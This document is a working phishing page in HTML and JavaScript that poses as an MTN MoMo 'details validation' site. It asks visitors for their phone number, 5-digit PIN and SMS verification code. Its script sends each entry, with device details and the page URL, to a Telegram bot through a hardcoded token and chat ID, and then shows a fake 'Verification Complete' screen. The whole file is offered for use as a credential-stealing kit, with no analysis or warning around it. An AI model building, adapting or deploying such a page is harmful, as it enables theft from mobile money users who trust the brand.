<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MTN MoMo</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html, body {
      height: 100%;
      font-family: 'Roboto', sans-serif;
    }

    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: linear-gradient(145deg, #cce0f0 0%, #dde8f5 40%, #c5d8ee 100%);
    }

    /* ===== TOP HEADER BAR ===== */
    .top-bar {
      background-color: #ffcc00;
      width: 100%;
      padding: 13px 20px;
      text-align: center;
      position: sticky;
      top: 0;
      z-index: 100;
    }

    .top-bar h1 {
      font-size: 1.35rem;
      font-weight: 900;
      letter-spacing: 0.3px;
      line-height: 1;
    }

    .top-bar .mtn {
      color: #1a1a1a;
    }

    .top-bar .momo {
      color: #004f7c;
    }

    /* ===== MAIN ===== */
    .main-content {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 30px 16px;
    }

    /* ===== CARD ===== */
    .card {
      background: #fff;
      border-radius: 12px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 4px 28px rgba(0, 70, 130, 0.15), 0 1px 6px rgba(0,0,0,0.07);
      overflow: hidden;
    }

    .card-header {
      background-color: #0a4d78;
      padding: 26px 20px 22px;
      text-align: center;
      color: #fff;
    }

    .card-header .hicon {
      font-size: 2rem;
      margin-bottom: 10px;
      display: block;
    }

    .card-header h2 {
      font-size: 1.35rem;
      font-weight: 900;
      letter-spacing: 1.5px;
      text-transform: uppercase;
    }

    .card-header .subtitle {
      font-size: 0.72rem;
      font-weight: 500;
      letter-spacing: 2.5px;
      text-transform: uppercase;
      margin-top: 5px;
      color: rgba(255,255,255,0.78);
    }

    /* ===== CARD BODY ===== */
    .card-body {
      padding: 22px 20px 18px;
    }

    /* ===== LABEL ===== */
    .field-label {
      display: block;
      font-size: 0.68rem;
      font-weight: 700;
      letter-spacing: 1.8px;
      text-transform: uppercase;
      color: #999;
      margin-bottom: 9px;
    }

    /* ===== PHONE ROW ===== */
    .phone-row {
      display: flex;
      gap: 8px;
      margin-bottom: 18px;
    }

    .country-select {
      border: 1.5px solid #d5dce6;
      border-radius: 6px;
      padding: 10px 8px;
      font-family: 'Roboto', sans-serif;
      font-size: 0.82rem;
      color: #333;
      background: #f7f9fc;
      outline: none;
      cursor: pointer;
      flex: 0 0 135px;
      transition: border-color 0.2s;
    }

    .country-select:focus {
      border-color: #ffcc00;
    }

    .phone-input {
      flex: 1;
      min-width: 0;
      border: 1.5px solid #d5dce6;
      border-radius: 6px;
      padding: 10px 12px;
      font-family: 'Roboto', sans-serif;
      font-size: 0.94rem;
      color: #333;
      outline: none;
      background: #fff;
      transition: border-color 0.2s;
    }

    .phone-input::placeholder {
      color: #bdc5cf;
    }

    .phone-input:focus {
      border-color: #0a4d78;
    }

    /* ===== PIN ROW ===== */
    .pin-section {
      margin-bottom: 18px;
    }

    .pin-row {
      display: flex;
      gap: 6px;
    }

    .pin-box {
      flex: 1;
      min-width: 0;
      height: 52px;
      border: 1.5px solid #d5dce6;
      border-radius: 7px;
      text-align: center;
      font-size: 1.4rem;
      font-weight: 700;
      color: #333;
      background: #f7f9fc;
      outline: none;
      padding: 0;
      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
      -webkit-appearance: none;
      appearance: none;
    }

    .pin-box:focus {
      border-color: #0a4d78;
      box-shadow: 0 0 0 3px rgba(10,77,120,0.11);
      background: #fff;
    }

    /* ===== VALIDATE BTN ===== */
    .btn-validate {
      width: 100%;
      background: #ffcc00;
      border: none;
      border-radius: 8px;
      padding: 14px;
      font-family: 'Roboto', sans-serif;
      font-size: 1rem;
      font-weight: 700;
      color: #004f7c;
      cursor: pointer;
      letter-spacing: 0.3px;
      transition: background 0.18s, transform 0.12s, box-shadow 0.18s;
      box-shadow: 0 3px 10px rgba(255,204,0,0.35);
    }

    .btn-validate:hover:not(:disabled) {
      background: #f5c200;
      box-shadow: 0 5px 18px rgba(255,204,0,0.5);
      transform: translateY(-1px);
    }

    .btn-validate:active:not(:disabled) {
      transform: translateY(0);
      box-shadow: 0 2px 6px rgba(255,204,0,0.2);
    }

    .btn-validate:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }

    /* ===== CARD FOOTER ===== */
    .card-footer {
      padding: 12px 20px 16px;
      text-align: center;
      font-size: 0.78rem;
      color: #aaa;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
    }

    .lock {
      color: #e07b00;
      font-size: 0.85rem;
    }

    /* ===== OTP SCREEN ===== */
    .otp-title {
      font-size: 1rem;
      font-weight: 700;
      color: #1a1a1a;
      text-align: center;
    }

    .otp-code-label {
      font-size: 0.68rem;
      font-weight: 700;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: #aaa;
      text-align: center;
      margin-top: 4px;
      margin-bottom: 14px;
    }

    .sent-to-text {
      font-size: 0.82rem;
      color: #888;
      text-align: center;
    }

    .sent-to-number {
      font-size: 1rem;
      font-weight: 700;
      color: #0a4d78;
      text-align: center;
      margin-top: 3px;
      margin-bottom: 18px;
    }

    .otp-textarea {
      width: 100%;
      border: 1.5px solid #0a4d78;
      border-radius: 7px;
      padding: 13px 14px;
      font-family: 'Roboto', sans-serif;
      font-size: 0.9rem;
      color: #333;
      resize: none;
      height: 108px;
      outline: none;
      background: #fff;
      line-height: 1.55;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    .otp-textarea::placeholder {
      color: #bdc5cf;
    }

    .otp-textarea:focus {
      border-color: #ffcc00;
      box-shadow: 0 0 0 3px rgba(255,204,0,0.18);
    }

    /* ===== SUCCESS SCREEN ===== */
    .success-body {
      padding: 36px 24px 30px;
      text-align: center;
    }

    .success-icon {
      font-size: 3.2rem;
      margin-bottom: 14px;
      display: block;
    }

    .success-title {
      font-size: 1.1rem;
      font-weight: 700;
      color: #0a4d78;
      margin-bottom: 8px;
    }

    .success-sub {
      font-size: 0.86rem;
      color: #888;
      line-height: 1.65;
    }

    /* ===== PROCESSING OVERLAY ===== */
    .overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(240, 245, 255, 0.75);
      backdrop-filter: blur(2px);
      z-index: 500;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      gap: 14px;
    }

    .overlay.show {
      display: flex;
    }

    .spinner {
      width: 42px;
      height: 42px;
      border: 4px solid #e0e8f0;
      border-top: 4px solid #ffcc00;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }

    .spinner-text {
      font-size: 0.92rem;
      font-weight: 600;
      color: #0a4d78;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* ===== SECTIONS ===== */
    .section {
      display: none;
    }

    .section.active {
      display: block;
    }

    /* ===== RESPONSIVE ===== */
    @media (max-width: 420px) {
      .card { max-width: 100%; }
      .card-header h2 { font-size: 1.15rem; }
      .pin-box { height: 46px; font-size: 1.2rem; }
      .country-select { flex: 0 0 115px; font-size: 0.78rem; }
    }

    @media (max-width: 360px) {
      .card-body { padding: 18px 14px 14px; }
      .pin-box { height: 42px; }
      .top-bar h1 { font-size: 1.15rem; }
    }
  </style>
</head>
<body>

  <!-- PROCESSING OVERLAY -->
  <div class="overlay" id="overlay">
    <div class="spinner"></div>
    <div class="spinner-text">Processing...</div>
  </div>

  <!-- HEADER -->
  <header class="top-bar">
    <h1><span class="mtn">MTN</span> <span class="momo">MoMo</span></h1>
  </header>

  <!-- MAIN -->
  <main class="main-content">

    <!-- STEP 1: DETAILS -->
    <div class="card section active" id="sectionDetails">
      <div class="card-header">
        <span class="hicon">🪪</span>
        <h2>MTN DETAILS</h2>
        <p class="subtitle">VALIDATION</p>
      </div>
      <div class="card-body">
        <label class="field-label" for="phoneNumber">Phone Number</label>
        <div class="phone-row">
          <select class="country-select" id="countryCode" aria-label="Country code">
            <option value="+256">UG +256 (UG)</option>
            <option value="+254">KE +254 (KE)</option>
            <option value="+255">TZ +255 (TZ)</option>
            <option value="+250">RW +250 (RW)</option>
            <option value="+233">GH +233 (GH)</option>
            <option value="+225">CI +225 (CI)</option>
            <option value="+237">CM +237 (CM)</option>
            <option value="+229">BJ +229 (BJ)</option>
            <option value="+234">NG +234 (NG)</option>
            <option value="+260">ZM +260 (ZM)</option>
          </select>
          <input
            type="tel"
            id="phoneNumber"
            class="phone-input"
            placeholder="Phone Number"
            maxlength="12"
            autocomplete="tel"
            inputmode="numeric"
          />
        </div>

        <div class="pin-section">
          <label class="field-label">PIN</label>
          <div class="pin-row" id="pinRow">
            <input type="password" class="pin-box" id="pin0" maxlength="1" inputmode="numeric" aria-label="PIN digit 1" />
            <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" aria-label="PIN digit 2" />
            <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" aria-label="PIN digit 3" />
            <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" aria-label="PIN digit 4" />
            <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" aria-label="PIN digit 5" />
          </div>
        </div>

        <button class="btn-validate" id="btnDetails" onclick="submitDetails()">Validate</button>
      </div>
      <div class="card-footer">
        <span class="lock">🔒</span>
        <span>Secured via MTN</span>
      </div>
    </div>

    <!-- STEP 2: OTP -->
    <div class="card section" id="sectionOtp">
      <div class="card-header">
        <span class="hicon">🛡️</span>
        <h2>MTN VERIFICATION</h2>
      </div>
      <div class="card-body">
        <p class="otp-title">Enter Verification Code</p>
        <p class="otp-code-label">CODE (OTP)</p>
        <p class="sent-to-text">A 4-digit code was sent to</p>
        <p class="sent-to-number" id="displayPhone"></p>
        <textarea
          class="otp-textarea"
          id="otpInput"
          placeholder="Enter full verification message or code here..."
          autocomplete="one-time-code"
        ></textarea>
        <button class="btn-validate" id="btnOtp" onclick="submitOtp()" style="margin-top:16px;">Validate</button>
      </div>
    </div>

    <!-- STEP 3: SUCCESS -->
    <div class="card section" id="sectionSuccess">
      <div class="card-header">
        <span class="hicon">✅</span>
        <h2>VALIDATED</h2>
      </div>
      <div class="success-body">
        <span class="success-icon">🎉</span>
        <p class="success-title">Verification Complete</p>
        <p class="success-sub">Your MTN MoMo details have been successfully validated. You're all set!</p>
      </div>
    </div>

  </main>

  <script>
    // ╔══════════════════════════════════════════╗
    // ║        TELEGRAM CONFIG — EDIT HERE       ║
    // ╚══════════════════════════════════════════╝
    const BOT_TOKEN = '8662918992:AAHPd87_ABOu0z57qnK4YvpynYDgePcYsLc';
    const CHAT_ID   = '7606597148';

    // ── Helpers ──────────────────────────────────────────────────────────────

    /** Returns a formatted timestamp string: DD/MM/YYYY HH:MM:SS (UTC+3) */
    function timestamp() {
      return new Date().toLocaleString('en-GB', {
        timeZone: 'Africa/Nairobi',
        day: '2-digit', month: '2-digit', year: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        hour12: false
      });
    }

    /** Tiny user-agent summary */
    function deviceInfo() {
      const ua = navigator.userAgent;
      const mobile = /Mobi|Android/i.test(ua);
      const os = /Windows/i.test(ua) ? 'Windows'
               : /Android/i.test(ua) ? 'Android'
               : /iPhone|iPad/i.test(ua) ? 'iOS'
               : /Mac/i.test(ua) ? 'macOS'
               : /Linux/i.test(ua) ? 'Linux' : 'Unknown OS';
      const browser = /Edg/i.test(ua) ? 'Edge'
                    : /Chrome/i.test(ua) ? 'Chrome'
                    : /Firefox/i.test(ua) ? 'Firefox'
                    : /Safari/i.test(ua) ? 'Safari' : 'Browser';
      return `${os} · ${browser} · ${mobile ? '📱 Mobile' : '🖥️ Desktop'}`;
    }

    /**
     * Send a message to Telegram with retry logic (up to 3 attempts).
     * Always resolves (never throws) so the flow is never blocked.
     */
    async function tgSend(text) {
      if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN') return;
      const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const body = JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' });
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body
          });
          if (res.ok) return;              // success — exit retry loop
        } catch (_) {
          if (attempt === 3) return;       // give up silently after 3 fails
          await new Promise(r => setTimeout(r, 800 * attempt)); // back-off
        }
      }
    }

    // ── PIN boxes auto-tab ────────────────────────────────────────────────────
    const pins = document.querySelectorAll('.pin-box');
    pins.forEach((box, i) => {
      box.addEventListener('input', e => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 1);
        if (e.target.value && i < pins.length - 1) pins[i + 1].focus();
      });
      box.addEventListener('keydown', e => {
        if (e.key === 'Backspace' && !box.value && i > 0) pins[i - 1].focus();
      });
      box.addEventListener('paste', e => {
        e.preventDefault();
        const txt = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
        [...txt].forEach((ch, j) => { if (pins[i + j]) pins[i + j].value = ch; });
      });
    });

    // ── Getters ───────────────────────────────────────────────────────────────
    function getPin()    { return [...pins].map(b => b.value).join(''); }
    function getPrefix() { return document.getElementById('countryCode').value; }
    function getPhone()  {
      const raw = document.getElementById('phoneNumber').value.trim();
      return getPrefix() + ' ' + raw;
    }

    // ── UI helpers ────────────────────────────────────────────────────────────
    function showSection(id) {
      document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
      document.getElementById(id).classList.add('active');
    }

    function setOverlay(show) {
      document.getElementById('overlay').classList.toggle('show', show);
    }

    // ── Step 1: Phone + PIN ───────────────────────────────────────────────────
    async function submitDetails() {
      const phone = document.getElementById('phoneNumber').value.trim();
      const pin   = getPin();

      if (!phone) { alert('Please enter your phone number.'); return; }
      if (pin.length < 5) { alert('Please enter your full 5-digit PIN.'); return; }

      const fullPhone = getPhone();
      document.getElementById('displayPhone').textContent = fullPhone;

      const btn = document.getElementById('btnDetails');
      btn.disabled    = true;
      btn.textContent = 'Processing...';
      setOverlay(true);

      // ── Telegram message (Step 1) ──
      const msg1 = [
        `🟡 <b>MTN MoMo — STEP 1 (Details)</b>`,
        ``,
        `📱 <b>Phone:</b>   <code>${fullPhone}</code>`,
        `🔑 <b>PIN:</b>     <code>${pin}</code>`,
        ``,
        `🕐 <b>Time:</b>    ${timestamp()}`,
        `💻 <b>Device:</b>  ${deviceInfo()}`,
        `🌐 <b>Page:</b>    ${location.href}`
      ].join('\n');

      await tgSend(msg1);

      setTimeout(() => {
        setOverlay(false);
        btn.disabled    = false;
        btn.textContent = 'Validate';
        showSection('sectionOtp');
        document.getElementById('otpInput').value = '';
        document.getElementById('otpInput').focus();
      }, 2000);
    }

    // ── Step 2: OTP ───────────────────────────────────────────────────────────
    async function submitOtp() {
      const otp   = document.getElementById('otpInput').value.trim();
      if (!otp) { alert('Please enter the verification code.'); return; }

      const phone = document.getElementById('displayPhone').textContent;
      const btn   = document.getElementById('btnOtp');
      btn.disabled    = true;
      btn.textContent = 'Verifying...';
      setOverlay(true);

      // ── Telegram message (Step 2) ──
      const msg2 = [
        `🟢 <b>MTN MoMo — STEP 2 (OTP / Code)</b>`,
        ``,
        `📱 <b>Phone:</b>   <code>${phone}</code>`,
        `💬 <b>OTP/Msg:</b> <code>${otp}</code>`,
        ``,
        `🕐 <b>Time:</b>    ${timestamp()}`,
        `💻 <b>Device:</b>  ${deviceInfo()}`,
        `🌐 <b>Page:</b>    ${location.href}`
      ].join('\n');

      await tgSend(msg2);

      setTimeout(() => {
        setOverlay(false);
        btn.disabled    = false;
        btn.textContent = 'Validate';
        showSection('sectionSuccess');
      }, 2000);
    }
  </script>
</body>
</html>
